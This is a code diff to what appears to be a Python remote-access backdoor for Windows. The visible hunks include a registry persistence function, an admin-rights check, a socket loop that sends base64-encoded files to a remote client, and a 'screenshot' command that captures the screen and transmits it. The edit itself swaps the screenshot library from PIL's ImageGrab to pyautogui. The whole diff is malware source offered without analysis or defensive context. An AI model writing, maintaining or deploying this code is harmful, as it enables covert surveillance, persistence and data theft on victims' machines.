@@ -6,8 +6,7 @@ import platform
 import base64
 import shutil
 import winreg
-from PIL import ImageGrab # type: ignore
-
+import pyautogui
 
 def add_to_registry():
     try:
@@ -21,13 +20,11 @@ def add_to_registry():
     except:
         pass
 
-
 def check_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except:
         return False
-
 
 def connect():
     add_to_registry()
@@ -84,7 +81,7 @@ def connect():
                 client.send(b64 + b"ENDOFFILE")
 
             elif command == "screenshot":
-                img = ImageGrab.grab()
+                img = pyautogui.screenshot()
                 img.save("temp_screen.png")
                 with open("temp_screen.png", "rb") as f:
                     client.send(f.read() + b"ENDOFFILE")
@@ -101,7 +98,6 @@ def connect():
             break
 
     client.close()
-
 
 if __name__ == "__main__":
     connect()
